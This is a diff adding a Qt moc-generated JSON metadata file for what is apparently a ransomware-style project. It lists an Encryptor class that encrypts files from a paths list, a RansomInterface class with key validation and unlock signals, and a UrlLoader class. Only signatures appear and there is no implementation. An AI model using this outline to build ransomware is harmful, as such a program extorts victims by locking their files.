@@ -1,0 +1,141 @@
+[
+    {
+        "classes": [
+            {
+                "className": "Encryptor",
+                "lineNumber": 8,
+                "methods": [
+                    {
+                        "access": "public",
+                        "arguments": [
+                            {
+                                "name": "filePath",
+                                "type": "QString"
+                            },
+                            {
+                                "name": "key",
+                                "type": "QByteArray"
+                            }
+                        ],
+                        "index": 1,
+                        "name": "encryptFile",
+                        "returnType": "bool"
+                    },
+                    {
+                        "access": "public",
+                        "arguments": [
+                            {
+                                "name": "pathsFile",
+                                "type": "QString"
+                            },
+                            {
+                                "name": "key",
+                                "type": "QString"
+                            }
+                        ],
+                        "index": 2,
+                        "name": "encryptFromFile",
+                        "returnType": "void"
+                    }
+                ],
+                "object": true,
+                "qualifiedClassName": "Encryptor",
+                "signals": [
+                    {
+                        "access": "public",
+                        "arguments": [
+                            {
+                                "name": "success",
+                                "type": "bool"
+                            }
+                        ],
+                        "index": 0,
+                        "name": "encryptionFinished",
+                        "returnType": "void"
+                    }
+                ],
+                "superClasses": [
+                    {
+                        "access": "public",
+                        "name": "QObject"
+                    }
+                ]
+            }
+        ],
+        "inputFile": "Encrypt.h",
+        "outputRevision": 69
+    },
+    {
+        "classes": [
+            {
+                "className": "RansomInterface",
+                "lineNumber": 6,
+                "methods": [
+                    {
+                        "access": "public",
+                        "arguments": [
+                            {
+                                "name": "key",
+                                "type": "QString"
+                            }
+                        ],
+                        "index": 2,
+                        "name": "validateKey",
+                        "returnType": "void"
+                    }
+                ],
+                "object": true,
+                "qualifiedClassName": "RansomInterface",
+                "signals": [
+                    {
+                        "access": "public",
+                        "index": 0,
+                        "name": "unlock",
+                        "returnType": "void"
+                    },
+                    {
+                        "access": "public",
+                        "index": 1,
+                        "name": "invalidKey",
+                        "returnType": "void"
+                    }
+                ],
+                "superClasses": [
+                    {
+                        "access": "public",
+                        "name": "QObject"
+                    }
+                ]
+            }
+        ],
+        "inputFile": "RansomInterface.h",
+        "outputRevision": 69
+    },
+    {
+        "classes": [
+            {
+                "className": "UrlLoader",
+                "lineNumber": 5,
+                "methods": [
+                    {
+                        "access": "public",
+                        "index": 0,
+                        "isConst": true,
+                        "name": "loadUrl",
+                        "returnType": "QString"
+                    }
+                ],
+                "object": true,
+                "qualifiedClassName": "UrlLoader",
+                "superClasses": [
+                    {
+                        "access": "public",
+                        "name": "QObject"
+                    }
+                ]
+            }
+        ],
+        "inputFile": "UrlLoader.h",
+        "outputRevision": 69
+    }
+]
